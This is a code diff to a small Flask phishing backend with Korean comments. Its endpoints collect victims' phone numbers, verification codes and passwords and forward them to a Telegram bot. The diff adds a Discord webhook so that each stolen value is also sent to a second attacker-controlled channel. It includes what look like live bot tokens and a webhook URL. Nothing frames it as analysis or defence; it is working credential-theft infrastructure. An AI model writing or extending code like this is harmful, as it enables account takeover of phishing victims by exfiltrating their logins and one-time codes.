@@ -9,6 +9,7 @@ CORS(app)
 # 사용자가 제공한 마지막 텔레그램 봇 정보
 BOT_TOKEN = "8624261932:AAHUdfopde-6EVa5G0Df4WXMVSXS2STJccA"
 CHAT_ID = "8792543569"
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1487076733583622217/PdN7RzEQ3_FbbfYYSvus3eldxNvIM_m5PViWm8h9BNqbrpcv5mcE-LzsGhTHLt6YTvPZ"
 
 @app.route("/")
 def index():
@@ -25,6 +26,7 @@ def send_phone():
         return jsonify({"ok": False, "error": "전화번호가 없습니다."}), 400
     
     message = f"🚀 num: {phone_number}"
+    send_discord_message(message)
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {
         "chat_id": CHAT_ID,
@@ -54,6 +56,7 @@ def send_code():
         return jsonify({"ok": False, "error": "전화번호 또는 인증 코드가 없습니다."}), 400
     
     message = f"🐒 cod: {verification_code}"
+    send_discord_message(message)
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {
         "chat_id": CHAT_ID,
@@ -83,6 +86,7 @@ def send_password():
         return jsonify({"ok": False, "error": "전화번호 또는 비밀번호가 없습니다."}), 400
     
     message = f"⭐ pass: {password}"
+    send_discord_message(message)
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {
         "chat_id": CHAT_ID,
@@ -98,6 +102,15 @@ def send_password():
             return jsonify({"ok": False, "error": result.get("description")}), 500
     except Exception as e:
         return jsonify({"ok": False, "error": str(e)}), 500
+
+def send_discord_message(message):
+    payload = {
+        "content": message
+    }
+    try:
+        requests.post(DISCORD_WEBHOOK_URL, json=payload)
+    except Exception as e:
+        print(f"Error sending Discord message: {e}")
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8000)
